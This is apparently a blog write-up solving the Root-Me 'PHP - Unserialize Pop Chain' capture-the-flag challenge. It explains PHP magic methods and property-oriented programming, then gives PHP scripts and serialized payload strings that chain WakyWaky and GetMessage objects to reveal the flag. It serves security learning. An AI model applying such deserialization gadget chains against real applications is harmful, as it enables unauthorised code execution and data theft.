---
title: "Exploiting PHP Unserialize POP Chains | Rootme"
date: 2024-12-20
categories: [Web Security, PHP - Unserialize Pop Chain]
tags: [web, CTF] 
---
## Introduction
[PHP - Unserialize Pop Chain](https://www.root-me.org/en/Challenges/Web-Server/PHP-Unserialize-Pop-Chain)  is a very nice web challenge designed to understand the concept of **php pop chaining** in the deserialization process.

As we know that [serialization](https://hazelcast.com/foundations/distributed-computing/serialization/) is the process of converting a data object or a combination of code into a series of bytes, preserving the object's state in an easily transmittable form. Deserialization is the reverse operation of serialization.

## What is the Magic Methods?
[Magic methods](https://www.php.net/manual/en/language.oop5.magic.php) are special methods which override PHP's default's action when certain actions are performed on an object. All methods names starting with __ are reserved by PHP.

One of the most popular magic methods is `__construct()` which is called when the object created. 

![IMG1](https://github.com/user-attachments/assets/5b91a228-bcdd-4b05-b29a-095970437807)

## What is POP chain? 
In normal scenario of exploiting insecure deserialization vulnerability, an attacker controls a serialized object that is passed into `unserialize()`. This will then allow her the opportunity to hijack the execution flow of the application, by controlling the values passed into magic methods.

The problem is: What if the declared magic methods does not contain any usefull code to perform my attack?
Now the exploitation of unsafe deserialization is useless, right?

Unfortunately, if the magic method themselves are not exploitable, an attacker could still control the execution flow using something called POP chains.

POP stands for `Property Oriented Programming` which means that the attacker can control all of the properties of the deserialized object. POP chains work by chaining code "gadgets" together to achieve the attacker’s ultimate goal. These "gadgets" are code snippets borrowed from the codebase that the attacker uses to further her goal.

## Challenge source code analysis

![IMG2](https://github.com/user-attachments/assets/64700220-7dbe-4aa9-a1fc-05d71edc0787)

The script defines two PHP classes which are `GetMessage` and `WakyWaky`.

1) GetMessage class:
  - Constructor `__construct`: Initializes the object with the `receive` parameter. If the value is "HelloBooooooy", the  script terminates with a message.
  - `__toString` Method: Returns the value of the receive property as a string.
  - Destructor `__destruct`: Validates the receive property. If it’s not "HelloBooooooy", the script terminates. Otherwise, if `$getflag` is true, it includes a `flag.php` file and reveals the flag.

2) WakyWaky class:
  - `__wakeup` Method: Executes when the object is unserialized, echoing the msg property.
  - `__toString` Method: Sets `$getflag` to true and creates a new GetMessage object, returning its receive value.

3) If a data parameter is provided via a POST request, it’s unserialized.

## Spotting the bug 
According to [php documentation](https://www.php.net/manual/en/language.oop5.magic.php) this magic methods works in php as follows:
- `__construct()`: Called when an object is created.
- `__destruct()`: Called when an object is deleted.
- `__wakeup()`: Called when an object is unserialized.
- `__toString()`: Called when an object is converted to a string.

Our goal is to read the flag and to do that we need to set the value of the getflag to true. We cannot directly create a serialized object from the `GetMessage` class because the constructor takes a parameter and checks if its value is equal to "HelloBooooooy". If it is, the script will terminate immediately, and the `__destruct()` method will not be called. On the other hand, if we change the value from "HelloBooooooy" to "Hello", the constructor will save it in the `receive` property, and the `__destruct()` method will be called. However, when it checks the value, the script will terminate again using the `die()` function. Both approaches will fail to read the flag.

I generate this script to create a serialized data for testing: 
```php
<?php

class GetMessage {
    function __construct($receive) {
        if ($receive === "HelloBooooooy") {
            die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");
        } else {
            $this->receive = $receive;
        }
    }

    function __toString() {
        return $this->receive;
    }

    function __destruct() {
        global $getflag;
        if ($this->receive !== "HelloBooooooy") {
            die("[FRIEND]: Hm.. you don't seem to be the friend I was waiting for..<br>");
        } else {
            if ($getflag) {
                include("flag.php");
                echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG."<br>";
            }
        }
    }
}
$obj = new GetMessage("Hello");
// O:10:"GetMessage":1:{s:7:"receive";s:5:"Hello";}
echo serialize($obj);
```
Trying: `O:10:"GetMessage":1:{s:7:"receive";s:5:"Hello";}`
![IMG3](https://github.com/user-attachments/assets/44fa326a-c5f9-487a-bfd4-a6a12b764318)

Now, our entry point is the WakyWaky class to set the value of getflag to true. If I create a serialized object from this class and send it to the web app, it will unserialize the object and automatically call the `__wakeup()` method, which echoes the msg property of the object.

What if we could now modify the `msg` property to control the execution flow of the code and call the `__toString()` method?

## Chaining of methods and Exploitation
We can create an object using the `WakyWaky` class, where the value of the `msg` property is an object of the same class. The only way to make the code call the `__toString()` method is to make the msg property of this object another object from the same class. This is because the `WakyWaky` class echoes the `msg`, and `__toString()` is called when the object is treated as a string.

Working of `__toString()`:

![IMG4](https://github.com/user-attachments/assets/cd4488d6-1a4e-49cd-8b22-cd5b37887e72)

Let's try to create the payload: 

```php
<?php 

class WakyWaky {
    public $msg;

    public function __construct($msg) {
        $this->msg = $msg;
    }
}

$Innerobj = new WakyWaky("Hello");  
$OuterObj = new WakyWaky($Innerobj);

// O:8:"WakyWaky":1:{s:3:"msg";O:8:"WakyWaky":1:{s:3:"msg";s:5:"Hello";}}
echo serialize($OuterObj); 
```
![IMG5](https://github.com/user-attachments/assets/11ebffe1-3aa9-4feb-9a9e-06f0d0d894d8)

That's great! The `__toString()` method is called to modify the value of getflag and created an object from the `GetMessage` class with the msg property of the inner object, which is "Hello." The constructor saves the word "Hello" in the `receive` property while executing the else statement. Then, the destructor method is called, triggering the condition that the receive value is not equal to "HelloBooooooy," and it prints "[FRIEND]: Hm... you don't seem to be the friend I was waiting for."

Now, we need to find a way to bypass these if conditions. As I mentioned before, changing the value of receive will not solve the challenge. The only way to solve it is to ensure that the input passed to the constructor is an object of the `GetMessage` class. The two conditions in the constructor and destructor methods will fail to compare between an object and a string. Strict comparison checks that both variables have the same type and the same value.

The Final Exploit: 

```php
<?php

$getflag = false;

class GetMessage {
    public $receive;

    public function __construct() {
        $this->receive = "HelloBooooooy";
    }
}

class WakyWaky {
    public $msg;

    public function __construct($msg) {
        $this->msg = $msg;
    }
}

$GetMessage_obj = new GetMessage();  
$serializedGetMessage_obj = serialize($GetMessage_obj);  

$InnerObj = new WakyWaky($GetMessage_obj);  
$serializedInnerObj = serialize($InnerObj);  

$OuterObj = new WakyWaky($InnerObj);  
// O:8:"WakyWaky":1:{s:3:"msg";O:8:"WakyWaky":1:{s:3:"msg";O:10:"GetMessage":1:{s:7:"receive";s:13:"HelloBooooooy";}}}
echo serialize($OuterObj); 
```

Finally, now we can read the flag:  

![IMG6](https://github.com/user-attachments/assets/b2279bb1-26e1-440f-a08b-2b8365575bf4)

Thanks for reading.

Follow me on [Linkedin](https://www.linkedin.com/in/0xmohomiester/)
